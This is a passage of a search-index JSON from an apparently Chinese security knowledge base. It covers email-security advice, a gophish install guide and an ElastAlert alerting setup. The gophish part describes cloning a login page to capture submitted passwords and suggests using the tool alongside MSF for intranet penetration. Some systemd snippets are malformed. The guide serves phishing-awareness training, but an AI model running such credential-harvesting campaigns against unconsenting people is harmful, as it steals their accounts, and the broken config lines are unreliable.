\u90ae\u7bb1\u5730\u5740\u4e0d\u8981\u968f\u610f\u4f20\u64ad\uff0c\u51cf\u5c11\u653b\u51fb\u8005\u627e\u5230\u653b\u51fb\u5165\u53e3\u7684\u53ef\u80fd\uff1b\u5fc5\u987b\u516c\u5f00\u90ae\u4ef6\u5730\u5740\u7684\uff0c\u53ef\u4ee5\u628a@\u7b26\u53f7\u7528\u5176\u4ed6\u7b26\u53f7\u66ff\u6362\uff0c\u907f\u514d\u88ab\u722c\u866b\u722c\u53d6\u8bc6\u522b\u540e\uff0c\u6210\u4e3a\u5783\u573e\u90ae\u4ef6\u548c\u653b\u51fb\u90ae\u4ef6\u7fa4\u53d1\u7684\u76ee\u6807\u3002 \u9488\u5bf9\u4f01\u4e1a \u914d\u7f6e\u5b89\u5168\u7ba1\u7406\u548c\u4f7f\u7528\u7535\u5b50\u90ae\u4ef6\u7b56\u7565\uff1a\u5305\u62ec\u7535\u5b50\u90ae\u4ef6\u6743\u9650\u3001\u6536\u53d1\u7528\u6237\u8eab\u4efd\u8bbe\u7f6e\u3001\u7535\u5b50\u90ae\u4ef6\u5185\u5bb9\u9650\u5236\u3001\u7535\u5b50\u90ae\u4ef6\u9644\u4ef6\u8981\u6c42\u3001\u90ae\u4ef6\u4f20\u8f93\u534f\u8bae\u5b89\u5168\u3001\u5f02\u5e38\u90ae\u4ef6\u76d1\u63a7\u3001\u7528\u6237\u5907\u4efd\u548c\u5f52\u6863\u4fdd\u5b58\u7b49\uff0c\u5177\u4f53\u53ef\u53c2\u8003\u300a\u4fe1\u606f\u5b89\u5168\u7b56\u7565\u7f16\u5236\u6307\u5357-L9\u7535\u5b50\u90ae\u4ef6\u5b89\u5168\u7b56\u7565\u300b \u3002 \u4fdd\u969c\u90ae\u4ef6\u7cfb\u7edf\u6240\u5728\u7684\u7f51\u7edc\u5b89\u5168\uff1a\u5305\u62ec\u7f51\u7edc\u7ed3\u6784\u5b89\u5168\u3001\u5165\u4fb5\u9632\u8303\u548c\u5b89\u5168\u5ba1\u8ba1\u7b49\uff0c\u53ef\u53c2\u8003\u300a\u53ef\u7ba1\u7406\u7684\u7f51\u7edc\u8ba1\u5212V4.0\uff08NSA/IAD\uff09\u300b\u3002 \u4fdd\u969c\u90ae\u4ef6\u7cfb\u7edf\u8f6f\u786c\u4ef6\u5b89\u5168\uff1a\u5305\u62ec\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u6570\u636e\u5e93\u7684\u5b89\u5168\u9632\u8303\u7b56\u7565\uff0c\u53ef\u53c2\u8003 \u300aDISA\u5b89\u5168\u6280\u672f\u5b9e\u65bd\u6307\u5357STIG\u300b\u3002 \u786e\u4fdd\u90ae\u4ef6\u7cfb\u7edf\u7684\u7269\u7406\u548c\u7ba1\u7406\u5b89\u5168\uff1a\u5305\u62ec\u8bbf\u95ee\u63a7\u5236\u3001\u7ba1\u7406\u5236\u5ea6\u7b49\uff0c\u5177\u4f53\u53ef\u53c2\u8003 \u300aYD/T 3161-2016\u90ae\u4ef6\u7cfb\u7edf\u5b89\u5168\u9632\u62a4\u8981\u6c42\u300b\u3002 \u53c2\u8003\u8d44\u6599 \u4f01\u4e1a\u90ae\u4ef6\u5b89\u5168\u9632\u62a4\u7ecf\u9a8c\u603b\u7ed3 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u5b9e\u8df5\u4e4b\u90ae\u4ef6\u5b89\u5168 \u90ae\u4ef6\u5b89\u5168\u9632\u62a4\u5b9e\u8df5 \u6536\u5230\u201c\u6765\u81ea\u81ea\u5df1\u201d\u7684\u6572\u8bc8\u90ae\u4ef6\uff0c\u8bf7\u4e0d\u8981\u60ca\u614c \u9493\u9c7c\u90ae\u4ef6\u521d\u63a2\uff1a\u9ed1\u5ba2\u662f\u5982\u4f55\u8fdb\u884c\u90ae\u4ef6\u4f2a\u9020\u7684 \u5e38\u89c1\u7684\u9493\u9c7c\u90ae\u4ef6\u7c7b\u578b\u6709\u54ea\u4e9b","title":"\u90ae\u4ef6\u5b89\u5168"},{"location":"infrastructure-security/network-security/office-network-security/email-security/#_1","text":"","title":"\u90ae\u4ef6\u5b89\u5168"},{"location":"infrastructure-security/network-security/office-network-security/email-security/#phishing-email","text":"\u4f5c\u8005\uff1a \u5343\u57df\u5343\u5bfb \u7f51\u7edc\u9493\u9c7c\u4e8b\u4ef6\u5728\u7f51\u7edc\u4e16\u754c\u4e2d\u6bcf\u65f6\u6bcf\u523b\u90fd\u5728\u53d1\u751f\uff0c\u5404\u79cd\u6b3a\u8bc8\u624b\u6bb5\u82b1\u6837\u7ffb\u65b0\uff0c\u9632\u4e0d\u80dc\u9632\u3002\u800c\u8fd9\u5176\u4e2d\u6709\u4e00\u7c7b\u9493\u9c7c\u624b\u6bb5\u662f\u9ed1\u5ba2\u6700\u5e38\u7528\u7684\u90a3\u5c31\u662f\u90ae\u4ef6\u9493\u9c7c\u3002\u9493\u9c7c\u90ae\u4ef6\u901a\u5e38\u53ef\u4ee5\u5206\u4e09\u4e2a\u7c7b\u522b\uff1a \u94fe\u63a5\u9493\u9c7c\u90ae\u4ef6 \u3001 \u9644\u4ef6\u9493\u9c7c\u90ae\u4ef6 \u4ee5\u53ca \u90ae\u4ef6\u5934\u4f2a\u9020\u9493\u9c7c\u90ae\u4ef6 \uff08\u6216\u8005\u53eb\u4eff\u5192\u90ae\u4ef6\uff09\u3002","title":"\u9493\u9c7c\u90ae\u4ef6 Phishing Email"},{"location":"infrastructure-security/network-security/office-network-security/email-security/#_2","text":"","title":"\u9493\u9c7c\u90ae\u4ef6\u7c7b\u578b"},{"location":"infrastructure-security/network-security/office-network-security/email-security/#_3","text":"\u94fe\u63a5\u9493\u9c7c \u9644\u4ef6\u9493\u9c7c \u90ae\u4ef6\u5934\u4f2a\u9020\u9493\u9c7c","title":"\u90ae\u4ef6\u9493\u9c7c\u539f\u7406"},{"location":"infrastructure-security/network-security/office-network-security/email-security/#_4","text":"\u9488\u5bf9\u7528\u6237 \u63d0\u9ad8\u4e2a\u4eba\u5b89\u5168\u610f\u8bc6\uff0c\u6536\u53d1\u90ae\u4ef6\u65f6\u786e\u8ba4\u6536\u53d1\u6765\u6e90\u662f\u5426\u53ef\u9760\uff0c\u4e0d\u8981\u968f\u610f\u70b9\u51fb\u6216\u8005\u590d\u5236\u90ae\u4ef6\u4e2d\u7684\u7f51\u5740\uff0c\u4e0d\u8981\u8f7b\u6613\u4e0b\u8f7d\u6765\u6e90\u4e0d\u660e\u7684\u9644\u4ef6\uff0c\u5efa\u8bae\u5bf9\u964c\u751f\u4eba\u90ae\u4ef6\u4e00\u5f8b\u4e0d\u6253\u5f00\u3002 \u5c3d\u91cf\u4e0d\u5728\u975e\u53ef\u63a7\u73af\u5883\u4e0b\u767b\u5f55\u7535\u5b50\u90ae\u4ef6\uff0c\u5982\u7f51\u5427\u7684\u7535\u8111\u3001\u5176\u4ed6\u4eba\u7684\u7535\u8111\u7b49\u3002 \u786e\u4fdd\u90ae\u4ef6\u6536\u53d1\u548c\u767b\u9646\u7ec8\u7aef\u7cfb\u7edf\u7684\u73af\u5883\u5b89\u5168\uff08PC\u3001\u624b\u673a\u3001PAD\u7b49\uff09\uff0c\u53ca\u65f6\u5347\u7ea7\u66f4\u65b0\u548c\u8fdb\u884c\u6f0f\u6d1e\u8865\u4e01\u4fee\u590d\uff0c\u5b89\u88c5\u7ec8\u7aef\u5b89\u5168\u9632\u62a4\u8f6f\u4ef6\u5e76\u53ca\u65f6\u5347\u7ea7\u6253\u5f00\u76d1\u63a7\uff0c\u786e\u4fdd\u90ae\u4ef6\u6536\u53d1\u7684\u73af\u5883\u5b89\u5168\u3002 \u90ae\u7bb1\u5bc6\u7801\u5fc5\u987b\u4f7f\u7528\u5f3a\u5bc6\u7801\uff08\u4f8b\u5982\uff1a\u5bc6\u7801\u957f\u5ea6\u5927\u4e8e12\u4f4d\u5b57\u7b26\uff0c\u4e14\u5fc5\u987b\u4e3a\u6570\u5b57\u3001\u82f1\u6587\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7ec4\u5408\uff09\uff0c\u5e76\u5b9a\u671f\u66f4\u6362\u5bc6\u7801\uff1b\u5bc6\u7801\u4e0d\u5f97\u4e0e\u5176\u4ed6\u670d\u52a1\u6df7\u7528\u3002 \u5982\u4f7f\u7528\u90ae\u4ef6\u5ba2\u6237\u7aef\uff0c\u786e\u4fdd\u5ba2\u6237\u7aef\u5b89\u88c5\u7a0b\u5e8f\u7684\u5b89\u5168\u6027\uff0c\u6309\u7167\u90ae\u4ef6\u670d\u52a1\u5668\u652f\u6301\u7684\u52a0\u5bc6\u94fe\u63a5\u65b9\u5f0f\uff08\u5982SSL\uff09\u914d\u7f6e\u90ae\u4ef6\u6536\u53d1\uff0c\u800c\u4e0d\u8981\u4f7f\u7528\u660e\u6587\u534f\u8bae\u6536\u53d1\u90ae\u4ef6\uff1b\u5bf9\u90ae\u4ef6\u5ba2\u6237\u7aef\u6570\u636e\u6587\u4ef6\u6240\u5728\u5377\uff0c\u5efa\u8bae\u91c7\u7528\u5377\u52a0\u5bc6\uff08\u5982Bitlocker\uff09\u3002 \u6d4f\u89c8\u5668\u6536\u53d1\u90ae\u4ef6\u65f6\uff0c\u9700\u8981\u4f7f\u7528HTTPS\u534f\u8bae\u767b\u9646\u4fe1\u7bb1\uff0c\u800c\u4e0d\u8981\u4f7f\u7528HTTP\u767b\u9646\u3002\u4ee5\u9632\u88ab\u55c5\u63a2\u7a83\u53d6\u8d26\u6237\u5bc6\u7801\u3002 \u6309\u7167\u7ec4\u7ec7\u89c4\u5b9a\u89c4\u8303\u8fdb\u884c\u90ae\u4ef6\u7b7e\u540d\u3002 \u90ae\u7bb1\u5730\u5740\u4e0d\u8981\u968f\u610f\u4f20\u64ad\uff0c\u51cf\u5c11\u653b\u51fb\u8005\u627e\u5230\u653b\u51fb\u5165\u53e3\u7684\u53ef\u80fd\uff1b\u5fc5\u987b\u516c\u5f00\u90ae\u4ef6\u5730\u5740\u7684\uff0c\u53ef\u4ee5\u628a@\u7b26\u53f7\u7528\u5176\u4ed6\u7b26\u53f7\u66ff\u6362\uff0c\u907f\u514d\u88ab\u722c\u866b\u722c\u53d6\u8bc6\u522b\u540e\uff0c\u6210\u4e3a\u5783\u573e\u90ae\u4ef6\u548c\u653b\u51fb\u90ae\u4ef6\u7fa4\u53d1\u7684\u76ee\u6807\u3002 \u9488\u5bf9\u4f01\u4e1a \u914d\u7f6e\u5b89\u5168\u7ba1\u7406\u548c\u4f7f\u7528\u7535\u5b50\u90ae\u4ef6\u7b56\u7565\uff1a\u5305\u62ec\u7535\u5b50\u90ae\u4ef6\u6743\u9650\u3001\u6536\u53d1\u7528\u6237\u8eab\u4efd\u8bbe\u7f6e\u3001\u7535\u5b50\u90ae\u4ef6\u5185\u5bb9\u9650\u5236\u3001\u7535\u5b50\u90ae\u4ef6\u9644\u4ef6\u8981\u6c42\u3001\u90ae\u4ef6\u4f20\u8f93\u534f\u8bae\u5b89\u5168\u3001\u5f02\u5e38\u90ae\u4ef6\u76d1\u63a7\u3001\u7528\u6237\u5907\u4efd\u548c\u5f52\u6863\u4fdd\u5b58\u7b49\uff0c\u5177\u4f53\u53ef\u53c2\u8003\u300a\u4fe1\u606f\u5b89\u5168\u7b56\u7565\u7f16\u5236\u6307\u5357-L9\u7535\u5b50\u90ae\u4ef6\u5b89\u5168\u7b56\u7565\u300b \u3002 \u4fdd\u969c\u90ae\u4ef6\u7cfb\u7edf\u6240\u5728\u7684\u7f51\u7edc\u5b89\u5168\uff1a\u5305\u62ec\u7f51\u7edc\u7ed3\u6784\u5b89\u5168\u3001\u5165\u4fb5\u9632\u8303\u548c\u5b89\u5168\u5ba1\u8ba1\u7b49\uff0c\u53ef\u53c2\u8003\u300a\u53ef\u7ba1\u7406\u7684\u7f51\u7edc\u8ba1\u5212V4.0\uff08NSA/IAD\uff09\u300b\u3002 \u4fdd\u969c\u90ae\u4ef6\u7cfb\u7edf\u8f6f\u786c\u4ef6\u5b89\u5168\uff1a\u5305\u62ec\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u6570\u636e\u5e93\u7684\u5b89\u5168\u9632\u8303\u7b56\u7565\uff0c\u53ef\u53c2\u8003 \u300aDISA\u5b89\u5168\u6280\u672f\u5b9e\u65bd\u6307\u5357STIG\u300b\u3002 \u786e\u4fdd\u90ae\u4ef6\u7cfb\u7edf\u7684\u7269\u7406\u548c\u7ba1\u7406\u5b89\u5168\uff1a\u5305\u62ec\u8bbf\u95ee\u63a7\u5236\u3001\u7ba1\u7406\u5236\u5ea6\u7b49\uff0c\u5177\u4f53\u53ef\u53c2\u8003 \u300aYD/T 3161-2016\u90ae\u4ef6\u7cfb\u7edf\u5b89\u5168\u9632\u62a4\u8981\u6c42\u300b\u3002","title":"\u9493\u9c7c\u90ae\u4ef6\u9632\u5fa1\u5efa\u8bae"},{"location":"infrastructure-security/network-security/office-network-security/email-security/#_5","text":"\u4f01\u4e1a\u90ae\u4ef6\u5b89\u5168\u9632\u62a4\u7ecf\u9a8c\u603b\u7ed3 \u4f01\u4e1a\u5b89\u5168\u5efa\u8bbe\u5b9e\u8df5\u4e4b\u90ae\u4ef6\u5b89\u5168 \u90ae\u4ef6\u5b89\u5168\u9632\u62a4\u5b9e\u8df5 \u6536\u5230\u201c\u6765\u81ea\u81ea\u5df1\u201d\u7684\u6572\u8bc8\u90ae\u4ef6\uff0c\u8bf7\u4e0d\u8981\u60ca\u614c \u9493\u9c7c\u90ae\u4ef6\u521d\u63a2\uff1a\u9ed1\u5ba2\u662f\u5982\u4f55\u8fdb\u884c\u90ae\u4ef6\u4f2a\u9020\u7684 \u5e38\u89c1\u7684\u9493\u9c7c\u90ae\u4ef6\u7c7b\u578b\u6709\u54ea\u4e9b","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/network-security/office-network-security/gophish/","text":"gophish \u5f00\u6e90\u9493\u9c7c\u5de5\u5177 \u5f00\u6e90\u9493\u9c7c\u5de5\u5177\uff1a\u652f\u6301\u914d\u7f6e\u9493\u9c7c\u90ae\u4ef6\u6a21\u677f\u3001\u516c\u53f8\u5458\u5de5\u90ae\u7bb1\u4fe1\u606f\u7b49\u7b49\uff1b github\u5730\u5740 \u5b89\u88c5\u4e0e\u4f7f\u7528 Centos7\u5b89\u88c5gophish # \u4e0b\u8f7d wget https://github.com/gophish/gophish/releases/download/0.7.1/gophish-v0.7.1-linux-64bit.zip # \u89e3\u538b\u5e76\u542f\u52a8 mkdir -p /app/gophish unzip gophish-v0.7.1-linux-64bit.zip -d /app/gophish/ cd /app/gophish/ # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u4fee\u6539\u76d1\u542c\u5730\u5740 # \u542f\u52a8gophish ./gophish # \u8bbf\u95ee\uff1ahttps://10.10.10.5:3333 # \u7528\u6237\u540d\uff1aadmin \u5bc6\u7801\uff1agophish # \u81f3\u6b64\u5b89\u88c5\u5b8c\u6210 \u57fa\u7840\u4f7f\u7528 \u914d\u7f6eUsers Groups \u914d\u7f6eEmail Templates \u914d\u7f6eLanding Pages \u914d\u7f6eSending Profiles \u4f7f\u7528gophish\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u8d26\u53f7\u5bc6\u7801 \u914d\u7f6e\u4e00\u4e2a\u7528\u4e8e\u9493\u9c7c\u7684\u9875\u9762 # \u6211\u8fd9\u91cc\u968f\u673a\u627e\u4e86\u4e00\u4e2a\u767b\u5f55\u7ad9\u70b9\u7528\u4e8e\u6d4b\u8bd5 # http://xnore.com/admin/login.php # \u70b9\u51fbimport site\uff0c\u586b\u5199\u5982\u4e0a\u7684\u7f51\u5740 # \u52fe\u9009Capture Submitted Data # \u52fe\u9009Capture Passwords # Redirect to\u586b\u5199\uff1ahttp://xnore.com/admin/login.php \u914d\u7f6e\u90ae\u4ef6\u7684\u6a21\u7248 # \u6784\u9020\u4e00\u5c01\u7528\u4e8e\u9493\u9c7c\u7684\u90ae\u4ef6 # \u67e5\u770b\u90ae\u4ef6\u6e90\u6587\u4ef6\uff0c\u590d\u5236\u6e90\u6587\u4ef6\u4fe1\u606f # \u5728\u90ae\u4ef6\u6a21\u7248\u9009\u62e9import email \u914d\u7f6eCampaigns # \u5458\u5de5\u8bbf\u95ee\u90ae\u4ef6 # \u5458\u5de5\u901a\u8fc7\u90ae\u4ef6\u4e2d\u7684\u5730\u5740\u8f93\u5165\u8d26\u53f7\u5bc6\u7801 \u4f7f\u7528\u5fc3\u5f97 \u4f18\u70b9 \u80fd\u591f\u8fdb\u884c\u4f01\u4e1a\u5185\u90e8\u5458\u5de5\u5b89\u5168\u610f\u8bc6\u57f9\u8bad\u8d77\u5230\u5f88\u597d\u7684\u8f85\u52a9\u4f5c\u7528\uff1b \u5982\u679c\u6761\u4ef6\u5141\u8bb8\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u7ed3\u5408MSF\u8fdb\u884cPC\u5185\u7f51\u6e17\u900f\uff1b \u7f3a\u70b9 \u4e0d\u652f\u6301\u5458\u5de5\u90ae\u7bb1\u5bfc\u5165\uff0c\u5982\u679c\u9700\u8981\u8fdb\u884c\"\u6d77\u9493\"\u9700\u8981\u4e00\u4e2a\u4e00\u4e2a\u6dfb\u52a0\uff0c\u624b\u5de5\u6d3b\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u6765\u5b9e\u73b0\uff1b \u83b7\u53d6\u7684\u7528\u6237\u4fe1\u606f\u53ea\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u3001\u6d4f\u89c8\u5668\u7248\u672c\u3001\u4ee5\u53ca\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u4e0d\u80fd\u7cbe\u51c6\u5b9a\u4f4d\u5230\u662f\u54ea\u4e2a\u7528\u6237\u70b9\u51fb\u4e86\u9493\u9c7c\u94fe\u63a5\uff1b \u53c2\u8003\u8d44\u6599 Automate Phishing Emails with GoPhish","title":"gophish \u5f00\u6e90\u9493\u9c7c\u5de5\u5177"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#gophish","text":"\u5f00\u6e90\u9493\u9c7c\u5de5\u5177\uff1a\u652f\u6301\u914d\u7f6e\u9493\u9c7c\u90ae\u4ef6\u6a21\u677f\u3001\u516c\u53f8\u5458\u5de5\u90ae\u7bb1\u4fe1\u606f\u7b49\u7b49\uff1b github\u5730\u5740","title":"gophish \u5f00\u6e90\u9493\u9c7c\u5de5\u5177"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#_1","text":"","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#centos7gophish","text":"# \u4e0b\u8f7d wget https://github.com/gophish/gophish/releases/download/0.7.1/gophish-v0.7.1-linux-64bit.zip # \u89e3\u538b\u5e76\u542f\u52a8 mkdir -p /app/gophish unzip gophish-v0.7.1-linux-64bit.zip -d /app/gophish/ cd /app/gophish/ # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6\uff0c\u4fee\u6539\u76d1\u542c\u5730\u5740 # \u542f\u52a8gophish ./gophish # \u8bbf\u95ee\uff1ahttps://10.10.10.5:3333 # \u7528\u6237\u540d\uff1aadmin \u5bc6\u7801\uff1agophish # \u81f3\u6b64\u5b89\u88c5\u5b8c\u6210","title":"Centos7\u5b89\u88c5gophish"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#_2","text":"\u914d\u7f6eUsers Groups \u914d\u7f6eEmail Templates \u914d\u7f6eLanding Pages \u914d\u7f6eSending Profiles","title":"\u57fa\u7840\u4f7f\u7528"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#gophish_1","text":"\u914d\u7f6e\u4e00\u4e2a\u7528\u4e8e\u9493\u9c7c\u7684\u9875\u9762 # \u6211\u8fd9\u91cc\u968f\u673a\u627e\u4e86\u4e00\u4e2a\u767b\u5f55\u7ad9\u70b9\u7528\u4e8e\u6d4b\u8bd5 # http://xnore.com/admin/login.php # \u70b9\u51fbimport site\uff0c\u586b\u5199\u5982\u4e0a\u7684\u7f51\u5740 # \u52fe\u9009Capture Submitted Data # \u52fe\u9009Capture Passwords # Redirect to\u586b\u5199\uff1ahttp://xnore.com/admin/login.php \u914d\u7f6e\u90ae\u4ef6\u7684\u6a21\u7248 # \u6784\u9020\u4e00\u5c01\u7528\u4e8e\u9493\u9c7c\u7684\u90ae\u4ef6 # \u67e5\u770b\u90ae\u4ef6\u6e90\u6587\u4ef6\uff0c\u590d\u5236\u6e90\u6587\u4ef6\u4fe1\u606f # \u5728\u90ae\u4ef6\u6a21\u7248\u9009\u62e9import email \u914d\u7f6eCampaigns # \u5458\u5de5\u8bbf\u95ee\u90ae\u4ef6 # \u5458\u5de5\u901a\u8fc7\u90ae\u4ef6\u4e2d\u7684\u5730\u5740\u8f93\u5165\u8d26\u53f7\u5bc6\u7801","title":"\u4f7f\u7528gophish\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u8d26\u53f7\u5bc6\u7801"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#_3","text":"","title":"\u4f7f\u7528\u5fc3\u5f97"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#_4","text":"\u80fd\u591f\u8fdb\u884c\u4f01\u4e1a\u5185\u90e8\u5458\u5de5\u5b89\u5168\u610f\u8bc6\u57f9\u8bad\u8d77\u5230\u5f88\u597d\u7684\u8f85\u52a9\u4f5c\u7528\uff1b \u5982\u679c\u6761\u4ef6\u5141\u8bb8\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u7ed3\u5408MSF\u8fdb\u884cPC\u5185\u7f51\u6e17\u900f\uff1b","title":"\u4f18\u70b9"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#_5","text":"\u4e0d\u652f\u6301\u5458\u5de5\u90ae\u7bb1\u5bfc\u5165\uff0c\u5982\u679c\u9700\u8981\u8fdb\u884c\"\u6d77\u9493\"\u9700\u8981\u4e00\u4e2a\u4e00\u4e2a\u6dfb\u52a0\uff0c\u624b\u5de5\u6d3b\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u901a\u8fc7\u811a\u672c\u6765\u5b9e\u73b0\uff1b \u83b7\u53d6\u7684\u7528\u6237\u4fe1\u606f\u53ea\u5305\u62ec\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u3001\u6d4f\u89c8\u5668\u7248\u672c\u3001\u4ee5\u53ca\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u4e0d\u80fd\u7cbe\u51c6\u5b9a\u4f4d\u5230\u662f\u54ea\u4e2a\u7528\u6237\u70b9\u51fb\u4e86\u9493\u9c7c\u94fe\u63a5\uff1b","title":"\u7f3a\u70b9"},{"location":"infrastructure-security/network-security/office-network-security/gophish/#_6","text":"Automate Phishing Emails with GoPhish","title":"\u53c2\u8003\u8d44\u6599"},{"location":"log_analysis/elastalert/","text":"ElastAlert ES\u62a5\u8b66\u5de5\u5177 elastalert GitHub\u5730\u5740 Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eElastAlert # \u89e3\u51b3python\u4f9d\u8d56 yum install epel-release -y yum install python2-pip.noarch pip install --upgrade pip # \u5b89\u88c5virtualenv\u6a21\u5757 pip install virtualenv # \u65b0\u5efa\u4e00\u4e2apython2.7\u7684\u865a\u62dfpython\u73af\u5883 virtualenv elastalert --python=python2.7 source elastalert/bin/activate pip install setuptools pip install elasticsearch git clone https://github.com/Yelp/elastalert.git cd elastalert pip install -r requirements.txt python setup.py install ElastAlert\u4f7f\u7528 # \u521b\u5efa\u7d22\u5f15 elastalert-create-index # \u6d4b\u8bd5\u89c4\u5219\u6587\u4ef6 elastalert-test-rule rule.yaml # \u542f\u52a8\u76d1\u63a7\u62a5\u8b66 python -m elastalert.elastalert --verbose --rule /root/elastalert/example_rules/rule.yaml \u914d\u7f6e\u670d\u52a1\u542f\u52a8ElastAlert mkdir /etc/elastalert cp /root/elastalert/config.yaml.example /etc/elastalert/config.yaml # \u521b\u5efa\u89c4\u5219\u76ee\u5f55 mkdir /etc/elastalert/rules cp /root/elastalert/example_rules/example_frequency.yaml /etc/elastalert/rules/ cp /root/elastalert/example_rules/example_frequency.yaml /etc/elastalert/rules/rule.yaml # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /etc/elastalert/config.yaml rules_folder: /etc/elastalert/rules # \u521b\u5efaelastalert\u670d\u52a1\u6587\u4ef6 vim /etc/systemd/system/elastalert.service elastalert.service\u6587\u4ef6\u5185\u5bb9 [Unit] Description=elastalert After=elasticsearch.service [Service] Type=simple User=root Group=root Restart=on-failure WorkingDirectory=/opt ExecStart=/usr/bin/python -m elastalert.elastalert --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml Install] WantedBy=multi-user.target config.yaml\u914d\u7f6e\u6587\u4ef6\u8bf4\u660e # \u89c4\u5219\u76ee\u5f55 rules_folder: # \u67e5\u8be2\u9891\u7387 run_every: \u90ae\u7bb1\u544a\u8b66 \u914d\u7f6e\u89c4\u5219\uff1avim /etc/elastalert/rules/rule.yaml # \u62a5\u8b66\u7c7b\u578b alert: - email smtp_host: smtp.126.com smtp_port: 25 smtp_auth_file: smtp_auth_file.yaml email_reply_to: email1_address from_addr: email1_address # \u63a5\u53d7\u90ae\u7bb1 email: - email2_address \u521b\u5efa\u90ae\u7bb1\u7684\u8ba4\u8bc1\u6587\u4ef6\uff1avim /etc/elastalert/rules/smtp_auth_file.yaml user: username password: password \u9489\u9489\u544a\u8b66 elastalert-dingtalk-plugin GitHub\u5730\u5740 \u63d2\u4ef6\u5b89\u88c5 # \u4e0b\u8f7d git clone https://github.com/xuyaoqiang/elastalert-dingtalk-plugin.git # \u590d\u5236\u63d2\u4ef6\u5230elastalert\u4e2d cp -r elastalert-dingtalk-plugin/elastalert_modules/ /etc/elastalert/ \u914d\u7f6e\u89c4\u5219\uff1avim /etc/elastalert/rules/rule.yaml # \u62a5\u8b66\u6a21\u5f0f alert: - elastalert_modules.dingtalk_alert.DingTalkAlerter # \u9489\u9489\u7684webhook\u63a5\u53e3 dingtalk_webhook: dingtalk_msgtype: text \u542f\u7528\u544a\u8b66 python -m elastalert.elastalert --verbose --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml \u914d\u7f6e\u670d\u52a1\u542f\u52a8\uff1avim /etc/systemd/system/elastalert.service [Unit] Description=elastalert After=elasticsearch.service [Service] Type=simple User=root Group=root Restart=on-failure WorkingDirectory=/opt ExecStart=cd /etc/elastalert /usr/bin/python -m elastalert.elastalert --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml Install] WantedBy=multi-user.target \u4f18\u5316\u544a\u8b66\u683c\u5f0f # \u6ce8\u610f\u4e0a\u4e0b\u5b57\u6bb5\u5bf9\u5e94 alert_text: | kibana_url: https://hostname:5601/app/kibana alarm_reason: 1\u5206\u949f\u5185login.php\u81f3\u5c11\u88ab\u8bbf\u95ee10\u6b21 alarm_name: {} request_uri: {} request_ip: {} response_status: {} alert_text_args: - name - request - clientip - response alert_text_type: alert_text_only","title":"ElastAlert ES\u62a5\u8b66\u5de5\u5177"},{"location":"log_analysis/elastalert/#elastalert-es","text":"elastalert GitHub\u5730\u5740","title":"ElastAlert ES\u62a5\u8b66\u5de5\u5177"},{"location":"log_analysis/elastalert/#centos7elastalert","text":"# \u89e3\u51b3python\u4f9d\u8d56 yum install epel-release -y yum install python2-pip.noarch pip install --upgrade pip # \u5b89\u88c5virtualenv\u6a21\u5757 pip install virtualenv # \u65b0\u5efa\u4e00\u4e2apython2.7\u7684\u865a\u62dfpython\u73af\u5883 virtualenv elastalert --python=python2.7 source elastalert/bin/activate pip install setuptools pip install elasticsearch git clone https://github.com/Yelp/elastalert.git cd elastalert pip install -r requirements.txt python setup.py install","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eElastAlert"},{"location":"log_analysis/elastalert/#elastalert","text":"# \u521b\u5efa\u7d22\u5f15 elastalert-create-index # \u6d4b\u8bd5\u89c4\u5219\u6587\u4ef6 elastalert-test-rule rule.yaml # \u542f\u52a8\u76d1\u63a7\u62a5\u8b66 python -m elastalert.elastalert --verbose --rule /root/elastalert/example_rules/rule.yaml","title":"ElastAlert\u4f7f\u7528"},{"location":"log_analysis/elastalert/#elastalert_1","text":"mkdir /etc/elastalert cp /root/elastalert/config.yaml.example /etc/elastalert/config.yaml # \u521b\u5efa\u89c4\u5219\u76ee\u5f55 mkdir /etc/elastalert/rules cp /root/elastalert/example_rules/example_frequency.yaml /etc/elastalert/rules/ cp /root/elastalert/example_rules/example_frequency.yaml /etc/elastalert/rules/rule.yaml # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /etc/elastalert/config.yaml rules_folder: /etc/elastalert/rules # \u521b\u5efaelastalert\u670d\u52a1\u6587\u4ef6 vim /etc/systemd/system/elastalert.service elastalert.service\u6587\u4ef6\u5185\u5bb9 [Unit] Description=elastalert After=elasticsearch.service [Service] Type=simple User=root Group=root Restart=on-failure WorkingDirectory=/opt ExecStart=/usr/bin/python -m elastalert.elastalert --config /etc/elastalert/config.yaml --rule /etc/elastalert/rules/rule.yaml Install] WantedBy=multi-user.target","title":"\u914d\u7f6e\u670d\u52a1\u542f\u52a8ElastAlert"},{"location":"log_analysis/elastalert/#configyaml","text":"# \u89c4\u5219\u76ee\u5f55 rules_folder: # \u67e5\u8be2\u9891\u7387 